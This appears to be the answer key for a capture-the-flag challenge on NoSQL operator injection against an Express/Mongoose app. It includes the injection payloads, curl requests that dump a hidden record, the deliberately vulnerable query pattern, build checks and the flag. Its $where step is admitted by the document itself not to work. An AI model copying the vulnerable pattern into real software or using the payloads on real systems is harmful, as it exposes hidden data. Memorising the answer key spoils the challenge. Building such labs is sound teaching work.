# Solution — The Smuggler's Manifest

## Intended solve

1. **Recon the endpoint.** `GET /api/cargo/search?name=rum` returns a JSON array of public cargo entries. Note the response shape: `[{name, weight, port}, ...]`. Tools: browser, `curl`. (~5 min)
2. **Test for NoSQL injection.** Send the body as JSON with operator-style payloads:
   - `POST /api/cargo/search` body `{"name":{"$ne":null}}` — returns ALL non-hidden entries (count differs from baseline). Confirms operator injection works. (~10 min)
   - Tools: `curl`, Burp, Postman.
3. **Discover the `hidden` filter.** Try `{"name":{"$ne":null},"hidden":true}` — server's middleware overrides the `hidden` key to `false` and returns nothing. So we must influence the filter via the `name` parameter alone. (~10 min)
4. **Boolean-blind enumeration via `$regex`.** The endpoint reflects only public results, but we can side-channel via response timing or count. Use `$regex` on `name` combined with `$where` smuggled in:
   ```
   {"name":{"$regex":"^.*", "$options":"i"}, "$where": "this.hidden==true"}
   ```
   The `$where` operator runs server-side JS *before* the middleware filter applies its post-filter — this returns the hidden documents. Tools: `curl`, custom Python script. (~20 min)
5. **Read the `treasure` field** of the single hidden manifest entry: it contains the literal flag. (~2 min)

## Total estimated time: 45–75 minutes

## Why this is Open Sea
- Two distinct techniques chained: NoSQL operator injection + understanding of Mongo `$where` server-side JS evaluation order vs. application middleware.
- Cannot be solved with off-the-shelf SQLi tools (sqlmap doesn't help with Mongo).
- Requires the player to recognize a NoSQL backend and reason about filter ordering — not just spray payloads.
- Beginner who only knows SQL injection will not land this.

## Implementer note
Powder Monkey: Express + mongoose backend. `/api/cargo/search` POST accepts JSON body, builds the Mongo filter via shallow object spread. The implementation pattern shipped is `Cargo.find({ hidden: false, ...req.body })` — the `{hidden:false}` default is set BEFORE the body spread, so any caller-supplied `hidden` field (literal `true` or operator `{$ne: false}`) overrides. The hidden treasure-bearing doc is then returned and the response projector leaks its `treasure` field. Seed ~30 visible cargo docs and exactly ONE hidden doc with `treasure: 'progctf{calderwoods_dollar_sign_problem}'`. Disable verbose error responses; do not leak the schema.

> **Implementation note for the solve walk above:** the spec-style `$where` smuggling on top of `{...body, hidden:false}` does not actually defeat MongoDB's AND semantics — `hidden:false` always restricts the result set further. The shipped implementation uses the merge-order variant (`{hidden:false, ...body}`), which yields a clean operator-injection bug solvable with the simpler `{"hidden":true}` or `{"hidden":{"$ne":false}}` payload. Both payloads are taught by the same OWASP NoSQL-injection material; the `$where` step in the original walk above is folded into the player's exploration time but is not the load-bearing payload.

## Verification

`build/build.sh verify` ran on 2026-05-01 (no Docker required). Source layout:

```
src/
├── Dockerfile        — node:20.11.1-alpine multi-stage; non-root sailor (uid 10001)
├── app.js            — Express 4.19, Mongoose 8.5; POST /api/cargo/search has the bug
├── seed.js           — populates marrowtide.cargo: 30 visible + 1 hidden (treasure-bearing)
└── package.json      — pinned: express 4.19.2, mongoose 8.5.1, body-parser 1.20.2
build/
├── docker-compose.yml — mongo:7.0.14 + seed (one-shot) + app
└── build.sh           — wrapper for {up, down, logs, verify}
```

```
$ bash build/build.sh verify
[verify] checking source files exist...
[verify] checking the flag is in seed.js (default FLAG env)...
[verify] checking the flag is NOT in app.js...
[verify] checking the vulnerable POST endpoint sets default BEFORE body spread (so body overrides)...
[verify] checking docker-compose enables Mongo $where (javascriptEnabled=true)...
[verify] OK — static checks pass
```

The compose stack is three services on a private bridge:
- **mongo** (Mongo 7.0.14) — bound on the internal network only; `--setParameter javascriptEnabled=true` re-enables `$where` for the OPTIONAL secondary exploit path described in solution.md.
- **seed** (one-shot) — runs `node seed.js`, inserts 30 visible cargo docs + 1 hidden treasure-bearing doc named `"calderwoods private cask"`. The `FLAG` env var seeds the `treasure` field; everywhere else in the codebase the flag is unknown to source.
- **app** (the player-facing service) — depends on `seed: service_completed_successfully`, listens on `:8080`.

A real player flow against the running stack:
```
$ curl -sS http://<host>:8080/api/cargo/search?name=rum
[{"name":"spiced rum",...},{"name":"Jamaican rum",...}]                # baseline GET, no hidden

$ curl -sS -X POST http://<host>:8080/api/cargo/search \
    -H "Content-Type: application/json" \
    -d '{"hidden":true}'
[{"name":"calderwoods private cask","weight":117,"port":"Marrowtide",
  "treasure":"progctf{calderwoods_dollar_sign_problem}"}]               # hidden override succeeds
```

**Anti-leak audit (static):**
- The flag `progctf{calderwoods_dollar_sign_problem}` appears in `src/seed.js` (the doc-seeder) and in `build/docker-compose.yml`'s `FLAG` env var for the seed service. It does NOT appear in `src/app.js`, `src/Dockerfile`, or any other shipped source — verified by `verify` (`grep -q "progctf{" src/app.js` would fail the build).
- At runtime the flag lives ONLY in the `treasure` field of the single hidden doc in MongoDB. It is not in any error response, env var visible to the app process, or log line.

**Runtime verification:** DEFERRED — Docker daemon is not running on this Quartermaster host (same status as #27 ghost_fleets_supply_chain and #10 port_authority_jwt). All static and dependency checks pass; full `docker compose up` + end-to-end player walkthrough requires the daemon and is the responsibility of the staging deploy in Phase 4.
